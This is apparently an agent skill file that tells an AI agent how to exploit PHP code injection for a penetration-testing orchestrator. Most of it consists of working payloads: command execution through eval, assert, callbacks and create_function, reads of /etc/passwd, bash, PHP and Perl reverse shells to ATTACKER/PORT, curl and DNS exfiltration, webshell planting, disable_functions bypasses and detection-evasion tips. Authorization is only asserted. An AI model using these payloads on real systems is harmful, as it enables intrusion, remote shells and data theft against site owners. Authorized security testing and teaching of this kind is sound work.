---
name: php-code-injection
description: >
  Exploit PHP code evaluation injection via eval(), assert(), preg_replace /e,
  create_function(), call_user_func(), usort() callbacks, and runtime function
  creation (runkit, uopz). Distinct from OS command injection (shell operators)
  and SSTI (template engines) — this targets direct PHP code evaluation of user
  input.
keywords:
  - php eval injection
  - eval() exploit
  - assert() injection
  - php code injection
  - create_function exploit
  - preg_replace /e modifier
  - call_user_func injection
  - usort callback injection
  - runkit_function_add
  - uopz_set_return
  - php sandbox escape
  - php RCE
  - php expression injection
tools:
  - burpsuite
  - curl
opsec: medium
---

# PHP Code Injection

You are helping a penetration tester exploit PHP code injection where user input
is passed to a PHP code evaluation function. The goal is to execute arbitrary
PHP code and escalate to OS command execution. All testing is under explicit
written authorization.

**This is NOT OS command injection.** Shell operators (`;`, `|`, `&&`) do not
work because the injection context is a PHP interpreter, not a shell. You must
write valid PHP expressions or statements.

**This is NOT SSTI.** If `{{7*7}}` or `${7*7}` returns `49`, route to the
appropriate SSTI skill. If bare PHP code like `phpinfo()` or `1+1` evaluates,
you're in the right place.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[php-code-injection] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames.

## Scope Boundary

This skill covers PHP code injection — from confirming the injection through
achieving OS command execution. When you reach the boundary of this scope —
**STOP**.

Do not load or execute another skill. Do not continue past your scope boundary.
Instead, return to the orchestrator with:
  - What was found (vulns, credentials, access gained)
  - Context to pass (injection point, target, working payloads, etc.)

The orchestrator decides what runs next. Your job is to execute this skill
thoroughly and return clean findings.

**Stay in methodology.** Only use techniques documented in this skill. If you
encounter a scenario not covered here, note it and return — do not improvise
attacks, write custom exploit code, or apply techniques from other domains.
The orchestrator will provide specific guidance or route to a different skill.

**Bail out on unmet preconditions.** If the Prerequisites for this skill are
not met (e.g., user input never reaches a code evaluation function), report a
negative finding and return immediately. Do not pivot to unrelated attack
vectors.

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- A parameter that gets passed to a PHP code evaluation function
- Common vulnerable patterns: dynamic callbacks, rule engines, plugin systems,
  sort comparators, regex with /e modifier, configuration evaluators
- Knowledge of the injection context (eval string, callback name, function body)

## Step 1: Assess

If not already provided, determine:

1. **Evaluation function** — which PHP function evaluates user input?
2. **Injection context** — is input the entire expression, a callback name,
   a function body, or embedded in a string?
3. **Visible or blind** — is output reflected, or side-channel only?
4. **Sanitization** — are dangerous functions disabled (`disable_functions`)?

### Vulnerable Functions Reference

| Function | Input Type | Context |
|----------|-----------|---------|
| `eval($code)` | PHP statements | Full code execution |
| `assert($expr)` (PHP < 8.0) | PHP expression string | Single expression |
| `preg_replace('/.*/e', $code, ...)` | PHP expression | Deprecated, removed in 7.0 |
| `create_function('$args', $body)` | PHP statements | Function body (deprecated 7.2, removed 8.0) |
| `call_user_func($callback, ...)` | Callable name | Controls which function is called |
| `usort($arr, $callback)` | Callable name | Comparison callback |
| `array_map($callback, $arr)` | Callable name | Applied to each element |
| `array_filter($arr, $callback)` | Callable name | Filter predicate |
| `runkit_function_add($name, $args, $body)` | PHP statements | Creates new function at runtime |
| `uopz_set_return($func, $value)` | Mixed | Overrides function return values |

Skip assessment if context was already provided.

## Step 2: Confirm Injection

### Quick Confirmation Probes

```php
// Arithmetic (most universal)
1+1
7*7

// PHP functions
phpversion()
php_uname()
str_repeat('A',3)

// Time-based (blind)
sleep(5)
usleep(5000000)
```

**Expected responses for confirmation:**
- `1+1` → `2` (not literal)
- `phpversion()` → version string like `8.1.2`
- `sleep(5)` → 5-second delay

### Disambiguate from SSTI

If `phpinfo()` works but `{{7*7}}` also returns `49`, you may be in a Twig/
Blade template context — route to the SSTI skill instead.

### Error-Based Confirmation

Inject invalid PHP to trigger errors:
```
<?php
)
function
```

PHP errors (`Parse error`, `Fatal error`, `Warning`) in the response confirm
PHP code evaluation. The error may reveal file paths and the evaluation
function.

## Step 3: Exploitation by Context

### Context A: eval() / assert() — Full Expression

Input is evaluated directly as PHP code:

```php
// OS command execution
system('id')
passthru('id')
shell_exec('id')
exec('id',$o);implode("\n",$o)
popen('id','r')->fread(4096)
`id`  // backtick operator

// File read
file_get_contents('/etc/passwd')
readfile('/etc/passwd')

// Reverse shell
system('bash -c "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"')
```

If inside a string context, break out first:
```php
// Application: eval("return '$INPUT';")
test'.system('id').'
test';system('id');//
```

### Context B: Callback Injection (call_user_func / usort / array_map)

User input controls which function is called:

```php
// If the app does: call_user_func($user_input, $arg)
// Set $user_input to:
system        // call_user_func('system', $arg) — $arg becomes the command
passthru      // same pattern
exec          // same pattern

// If you control both callback and argument:
call_user_func('system', 'id')
```

For `usort($arr, $callback)` — the callback receives two array elements as
arguments. If you control array contents AND the callback name:
```php
// Populate array with ['id',''] then set callback to 'system'
// usort calls system('id', '') — second arg ignored
```

### Context C: Function Body Injection

User input becomes the body of a dynamically created function (e.g.,
`create_function()`, `runkit_function_add()`, or similar runtime function
creation):

```php
// Application: create_function('$a,$b', $user_input)
// Or: runkit_function_add('func', '$a,$b', $user_input)

// Inject — close the intended body, add your code:
return 1;}system('id');//
return 1;}passthru('id');exit;//

// If the body is used as a rule/predicate that must return a value:
system('id');return true;
```

The function body is compiled when created but **executed when the function is
called**. Identify what triggers the function call (e.g., a form submission, a
scheduled event, an API endpoint) and trigger it after injecting the body.

### Context D: preg_replace /e (Legacy PHP < 7.0)

```php
// Application: preg_replace('/pattern/e', $user_input, $subject)
// The replacement is evaluated as PHP code for each match

// Payload in replacement:
system('id')
file_get_contents('/etc/passwd')
```

## Step 4: disable_functions Bypass

When `system()`, `exec()`, `passthru()`, `shell_exec()`, `popen()`, `proc_open()`
are in `disable_functions`:

```php
// Check what's disabled
ini_get('disable_functions')

// Alternative execution functions (often not disabled):
pcntl_exec('/bin/bash', ['-c', 'id > /tmp/out'])
mail('', '', '', '', '-X/tmp/out -OQueueDirectory=/tmp -OLogLevel=0')

// File operations (usually not disabled):
file_get_contents('/etc/passwd')
file_put_contents('/tmp/shell.php', '<?php system($_GET["c"]); ?>')
scandir('/')
glob('/home/*')

// If open_basedir is set, check its value:
ini_get('open_basedir')
```

**If `disable_functions` blocks all execution functions**, report the list of
disabled functions and `open_basedir` value. The orchestrator may route to a
sandbox escape approach (php.ini overwrite, LD_PRELOAD, FFI, iconv tricks).

## Step 5: Reverse Shell Payloads

```php
// Bash reverse shell
system('bash -c "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"')

// PHP native reverse shell (no system() needed — bypasses disable_functions
// if fsockopen is available)
$s=fsockopen('ATTACKER',PORT);$p=proc_open('/bin/sh',array(0=>$s,1=>$s,2=>$s),$pipes);

// Perl reverse shell (if perl is installed and system() available)
system('perl -e \'use Socket;$i="ATTACKER";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'')
```

### Blind Injection (No Output Reflected)

```php
// Time-based confirmation
sleep(5)

// DNS exfiltration
system('host $(whoami).ATTACKER.com')

// HTTP exfiltration
system('curl http://ATTACKER:PORT/$(whoami)')

// Write to webroot (retrieve via browser)
file_put_contents('/var/www/html/proof.txt', shell_exec('id'))
```

## Step 6: Escalate or Pivot

STOP and return to the orchestrator with:
- What was achieved (RCE, creds, file read, etc.)
- New credentials, access, or pivot paths discovered
- Context for next steps (platform, access method, working payloads)
- If `disable_functions` blocks execution: the full list + open_basedir value

## OPSEC Notes

- PHP code injection generates errors visible in application error logs
- `system()`/`exec()` create child processes visible in `ps`
- `file_get_contents()` for file reads creates no child processes — lower
  detection than `system('cat ...')`
- Reverse shells generate network connections logged by netflow/EDR
- `eval()` calls appear in PHP error stack traces

## Troubleshooting

### Payload Returns Empty

- Check if output buffering swallows the result. Try `ob_end_flush()` first
- `exec()` only returns the last line — use `system()` or `passthru()` instead
- If inside eval(), the return value may not be echoed — try `echo system('id')`

### Parse Error in Response

- Check quoting context — are you inside single quotes, double quotes, heredoc?
- Count semicolons and braces — function body injection needs proper closure
- PHP < 7 vs 8 differences: `assert()` no longer evaluates strings in PHP 8.0+

### All Execution Functions Disabled

- Check `ini_get('disable_functions')` for the exact list
- Try `proc_open()`, `pcntl_exec()`, `popen()` — often missed in blocklists
- Use file operations (`file_get_contents`, `file_put_contents`) to read
  configs and plant webshells
- Report to orchestrator for sandbox escape routing
